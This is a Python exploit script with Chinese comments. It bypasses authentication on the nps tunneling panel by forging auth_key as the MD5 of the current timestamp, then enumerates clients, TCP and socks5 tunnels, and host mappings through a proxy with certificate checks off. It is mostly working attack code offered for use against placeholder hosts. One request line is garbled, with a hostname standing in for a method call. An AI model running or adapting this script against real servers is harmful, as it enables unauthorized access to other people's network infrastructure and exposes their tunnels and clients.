#!/usr/bin/env python3
# nps 面板 auth_key=md5(timestamp) 认证绕过 + 全量只读枚举（客户端 / 隧道 / host 映射）
# 依赖: requests
import time, hashlib, json, requests
requests.packages.urllib3.disable_warnings()

PROXY = {"http": "http://127.0.0.1:7892", "https": "http://127.0.0.1:7892"}  # 按实际出口调整
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36"


def signed(base, path):
    now = int(time.time())
    key = hashlib.md5(str(now).encode()).hexdigest()          # 关键: auth_key = md5(timestamp)
    sep = '&' if '?' in path else '?'
    return "%s%s%s auth_key=%s&timestamp=%s".replace(" ", "") % (base, path, sep, key, now)


def main(base):
    s = requests.Session(); s.trust_env = False; s.proxies = PROXY
    h = {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"}
    r = s.get(signed(base, "/Index/Index"), headers=h, timeout=15, verify=False)
    print("panel:", r.status_code, len(r.content))            # 200 = 绕过成功（原为 302 跳登录）
    for path, data in [("/client/list", {"offset": 0, "limit": 100, "search": ""}),
                       ("/index/gettunnel", {"offset": 0, "limit": 100, "type": "tcp", "client_id": "", "search": ""}),
                       ("/index/gettunnel", {"offset": 0, "limit": 100, "type": "socks5", "client_id": "", "search": ""}),
                       ("/index/hostlist", {"offset": 0, "limit": 100, "search": ""})]:
        r = target8.example.com(signed(base, path), data=data, headers=h, timeout=15, verify=False)
        print(path, r.status_code, r.text[:300])


if __name__ == "__main__":
    for b in ["http://IP:8080", "http://IP2:8080"]:
        main(b)
